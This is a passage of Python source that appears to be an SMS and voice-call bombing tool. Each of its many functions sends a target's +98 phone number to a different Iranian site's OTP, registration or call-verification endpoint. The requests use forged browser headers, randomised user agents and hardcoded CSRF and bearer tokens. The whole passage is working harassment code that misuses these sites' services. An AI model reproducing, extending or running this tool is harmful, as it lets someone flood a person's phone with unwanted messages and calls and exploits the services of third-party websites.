        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://novinbook.com/index.php?route=account/phone",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def offch(phone):
        n4 = {"username":"0"+phone.split('+98')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://api.offch.com/auth/otp",json=n4, headers=rhead)
            return True
        except:
            pass

            
    def sibbazar(phone):
        liJ = {"username": "0"+phone.split('+98')[1]}
        liU = "https://sandbox.sibbazar.com/api/v1/user/invite"
        liH = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','content-length': ',26','origin': 'https://developer.sibbazar.com','referer': 'https://developer.sibbazar.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'}
        try:
            post(url=liU, headers=liH, json=liJ)    
            return True    
        except:
            pass

            
    def raminashop(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=d397aa3b0e&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A7%D8%AA%D8%B1%D8%AA%DB%8C%D8%A8%D8%A8&digregcode=%2B98&digits_reg_mail=0{phone.split('+98')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=d397aa3b0e"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '307','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://raminashop.com','referer': 'https://raminashop.com/?login=true&page=1&redirect_to=https%3A%2F%2Framinashop.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try: 
            post(url="https://raminashop.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass

            
    def sabziman(phone):
        n4 = f"action=newphoneexist&phonenumber=0{phone.split('+98')[1]}"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://sabziman.com','referer': 'https://sabziman.com/%D8%B3%D9%88%D8%A7%D9%84%D8%A7%D8%AA-%D9%85%D8%AA%D8%AF%D8%A7%D9%88%D9%84/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://sabziman.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass
            
            
    def tajtehran(phone):
        n4 = f"mobile=0{phone.split('+98')[1]}&password=mamad1234"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://tajtehran.com','referer': 'https://tajtehran.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
        try:
            post(url="https://tajtehran.com/RegisterRequest",data=n4, headers=rhead)
            return True
        except:
            pass
            
            
    def zivanpet(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split('+98')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://zivanpet.com','referer': 'https://zivanpet.com/?login=true&page=1&redirect_to=https%3A%2F%2Fzivanpet.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}

        try:
            post(url="https://zivanpet.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
            return True
        except:
            pass
            
            
    def okala(phone):
        n4 = {"mobile":"0"+ phone.split('+98')[1],"deviceTypeCode":0,"confirmTerms":True,"notRobot":False}
        rhead = {'user-agent': generate_user_agent(os="win")}
        try:
            post(url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",json=n4, headers=rhead)
            return True
        except:
            pass            
            
            
    def watchonline(phone):
        n4 = {"mobile":"0"+ phone.split('+98')[1]}
        rhead = {'Host': 'api.watchonline.shop','Connection': 'keep-alive','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','Accept': 'application/json','Content-Type': 'application/json','Authorization': 'Bearer 7e3b55d76312e3c127758e1a5d47d27d49ea22ebf7d9ba99cb9ff3516d34900b','Origin': 'https://www.watchonline.shop','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.watchonline.shop/','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
        try:
            post(url="https://api.watchonline.shop/api/v1/otp/request",json=n4, headers=rhead)
            return True
        except:
            pass            
            
    def gharar(phone):
        n4 = f"phone=0{phone.split('+98')[1]}"
        rhead = {'content-length': '17','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-csrftoken': 'DP6LQ9sSuEs45ZZuEh5DJJ7sIEHnW30KbVLZFDAmOnqymk6gUw4Z1e9RV1j17DhG','sec-ch-ua-platform': 'Android','origin': 'https://gharar.ir','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://gharar.ir/','accept-encoding': 'gzip, deflate, br','accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
        try:
            post(url="https://gharar.ir/users/phone_number/",data=n4, headers=rhead)
            return True
        except:
            pass            
            
class call:
    def paklean_call(phone):
        n4 = {"username": "0"+phone.split("+98")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
            post(url="https://client.api.paklean.com/user/resendVoiceCode", json=n4, headers=rhead)
            return True
        except:
            pass
        
    def novinbook_call(phone):
        n4 = f"phone=0{phone.split('+98')[1]}&call=yes"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'} 
        try:
            post(url="https://novinbook.com/index.php?route=account/phone",data=n4, headers=rhead)
            return True
        except:
            pass

    def azki_call(phone):
        HEADER = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'}
        try:
            get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{phone.split('+98')[1]}", headers=HEADER)
        except:
            pass

    def ragham_call(phone):
        # Call and sms 
        n4 = {"phone":phone}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://web.raghamapp.com/api/users/code",json=n4, headers=rhead)
            return True
        except:
            pass
